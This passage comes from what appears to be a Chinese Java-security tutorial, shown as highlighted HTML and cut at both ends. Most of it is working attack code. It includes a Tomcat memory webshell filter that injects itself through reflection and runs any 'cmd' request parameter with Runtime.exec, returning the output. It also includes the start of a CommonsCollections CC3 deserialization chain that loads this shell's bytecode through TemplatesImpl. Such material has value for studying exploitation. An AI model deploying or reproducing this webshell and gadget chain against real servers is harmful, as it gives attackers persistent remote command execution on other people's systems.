#B392F0\">setFilterClass(</span><span style=\"color: #79B8FF\">filter</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName());</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">standardContext</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">addFilterDef(filterDef);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">FilterMap</span><span style=\"color: #B392F0\"> filterMap</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> FilterMap();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">filterMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">addURLPattern(</span><span style=\"color: #FFAB70\">&quot;/*&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">filterMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setFilterName(name);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">filterMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setDispatcher(</span><span style=\"color: #79B8FF\">DispatcherType</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">REQUEST</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">name());</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">standardContext</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">addFilterMapBefore(filterMap);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> configsField</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">standardContext</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;filterConfigs&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">configsField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Map</span><span style=\"color: #B392F0\"> filterconfigs</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(</span><span style=\"color: #79B8FF\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">Map</span><span style=\"color: #B392F0\">)</span><span style=\"color: #79B8FF\">configsField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(standardContext);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Constructor</span><span style=\"color: #B392F0\"> constructor</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">ApplicationFilterConfig</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredConstructor(</span><span style=\"color: #79B8FF\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">Context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">FilterDef</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">constructor</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">ApplicationFilterConfig</span><span style=\"color: #B392F0\"> filterConfig</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(ApplicationFilterConfig) </span><span style=\"color: #79B8FF\">constructor</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">newInstance(standardContext</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\">filterDef);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">filterconfigs</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">put(name</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> filterConfig);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span><span style=\"color: #F97583\">catch</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> e)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">e</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">printStackTrace();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">Override</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> doFilter(</span><span style=\"color: #F97583\">ServletRequest</span><span style=\"color: #B392F0\"> request</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ServletResponse</span><span style=\"color: #B392F0\"> response</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">FilterChain</span><span style=\"color: #B392F0\"> chain) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">IOException</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ServletException</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> cmd </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getParameter(</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">PrintWriter</span><span style=\"color: #B392F0\"> writer </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">response</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWriter();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (cmd </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">try</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">InputStream</span><span style=\"color: #B392F0\"> in </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Runtime</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getRuntime()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">exec(cmd)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getInputStream();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #6B737C\">//将命令执行结果写入扫描器并读取所有输入</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Scanner</span><span style=\"color: #B392F0\"> scanner </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">Scanner(in)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">useDelimiter(</span><span style=\"color: #FFAB70\">&quot;\\\\A&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> result </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">scanner</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">hasNext()</span><span style=\"color: #F97583\">?</span><span style=\"color: #79B8FF\">scanner</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">next()</span><span style=\"color: #F97583\">:</span><span style=\"color: #FFAB70\">&quot;&quot;</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">scanner</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">close();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">write(result);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">flush();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">close();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125; </span><span style=\"color: #F97583\">catch</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> e)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">e</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">printStackTrace();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">chain</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">doFilter(request</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> response);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">Override</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> transform(</span><span style=\"color: #F97583\">DOM</span><span style=\"color: #B392F0\"> document</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">DTMAxisIterator</span><span style=\"color: #B392F0\"> iterator</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">SerializationHandler</span><span style=\"color: #B392F0\"> handler) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">TransletException</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">Override</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> transform(</span><span style=\"color: #F97583\">DOM</span><span style=\"color: #B392F0\"> document</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">SerializationHandler</span><span style=\"color: #B392F0\">[] handlers) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">TransletException</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">Override</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> init(</span><span style=\"color: #F97583\">FilterConfig</span><span style=\"color: #B392F0\"> filterConfig) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ServletException</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">Override</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> destroy() &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span></code></pre></div><p>然后将上面这块的字节码塞入 TemplatesImpl 的 bytes 中，用于最后的 defineClass 进行字节码加载</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">package</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">New</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xalan</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xsltc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">trax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">TemplatesImpl</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xalan</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xsltc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">trax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">TrAXFilter</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xalan</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">internal</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xsltc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">trax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">TransformerFactoryImpl</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Transformer</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">functors</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ChainedTransformer</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">functors</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ConstantTransformer</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">functors</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">InstantiateTransformer</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">keyvalue</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">TiedMapEntry</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">commons</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">collections</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">map</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">LazyMap</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">net</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">URLEncoder</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">xml</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">transform</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Templates</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">*</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">nio</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">file</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Files</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">nio</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">file</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Paths</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Base64</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Map</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> CC3Re0 &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">static</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> main(</span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[] args) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\">  </span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">TemplatesImpl</span><span style=\"color: #B392F0\"> templates</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> TemplatesImpl();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Class</span><span style=\"color: #B392F0\"> tc</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">templates</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> nameFiled</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">tc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;_name&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">nameFiled</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">nameFiled</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">set(templates</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;aaa&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">byte</span><span style=\"color: #B392F0\">[] bytes</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Files</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">readAllBytes(</span><span style=\"color: #79B8FF\">Paths</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(</span><span style=\"color: #FFAB70\">&quot;H://javasecurity/CC1/untitled/target/classes/org/New/shellfilter/Filtermemshell.class&quot;</span><span style=\"color: #B392F0\">));</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> bytecodesField</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">tc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;_bytecodes&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">bytecodesField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">byte</span><span style=\"color: #B392F0\">[] code</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> bytes;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">byte</span><span style=\"color: #B392F0\">[][] codes</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">&#123;code&#125;;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">bytecodesField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">set(templates</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\">codes);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> tfactoryField </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">tc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;_tfactory&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: 